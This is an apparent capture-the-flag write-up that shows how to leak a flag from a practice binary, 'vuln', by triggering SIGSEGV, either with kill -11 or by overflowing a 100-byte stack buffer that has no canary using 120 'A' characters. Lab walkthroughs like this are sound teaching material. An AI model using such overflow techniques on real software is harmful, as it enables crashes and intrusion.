> Source File: `vuln.c`

> Executable File: `vuln`
---
```
# ls
README.md  vuln  vuln.c
```
Detect `file type` first.
```
# file vuln
vuln: ELF 32-bit LSB pie executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=b53f59f147e1b0b087a736016a44d1db6dee530c, for GNU/Linux 3.2.0, not stripped
```
So, it's an ELF file. Lets make `executable` file and try to `run` it.
```
# chmod +x vuln
# ./vuln 
Please create 'flag.txt' in this directory with your own debugging flag.
```
So, we need to create `flag.txt` with dummmy content. Also, lets take a look on Source code.
```
# echo -n flag{WinayGupta777} | cat > flag.txt
# cat vuln.c
```
From the source code we can see, the global variable `flag` is set to the content of `flag.txt` file in `main()` function. And this `flag` is printed in `sigsegv_handler()` function. 

Line `signal(SIGSEGV, sigsegv_handler); // Set up signal handler` will listen for any `SIGSEGV` signal to this process when executable is running. 

So, We can get the `flag` printed in console if we can generate/send `SIGSEGV` signal to this executable while it's running.

### How to generate/send `SIGSEGV` signal in/to process?

#### Method 1:
In linux, using `kill` command we can send any `signal` to process using `signal code`.

Experiment - 
Execute `vuln` binary.
```
# ./vuln 
Input: 
```
Let's check for the `PID` of this process and send `SIGSEGV` signal code => `11` to it.
```
(in other terminal:)
# ps -aux | grep vuln
root       28247  0.0  0.0   2764  1280 pts/0    S+   12:28   0:00 ./vuln
# kill -11 28247
```
So, as soon as we enter the command, other side will see the `flag` printed in the screen.
```
# ./vuln 
Input: flag{WinayGupta777}
```

#### Method 2:
If the running process tries to read a memory address which doesn't exists then `SIGSEGV` signal occurs.

Here, in our binary, it asks for `input` and whatever will be given by us would store on the `stack`. From source code, we know buffer for storing the user `input` is given size of `100 bytes`.

Let's check if this binary has `canary` protection or not!

```
# checksec --file=vuln
[*] '/root/ELF-Exploitation/BOF-0/vuln'
    Arch:     i386-32-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```
We can see, `No canary found` which means if we provide more than 100 bytes than it would overwrite the other addresses on the stack. 

So, let's overwrite stack addresses by providing more than 100 bytes.

```
# python3 -c "print('A' * 120)"
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

# ./vuln 
Input: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
flag{WinayGupta777}
```

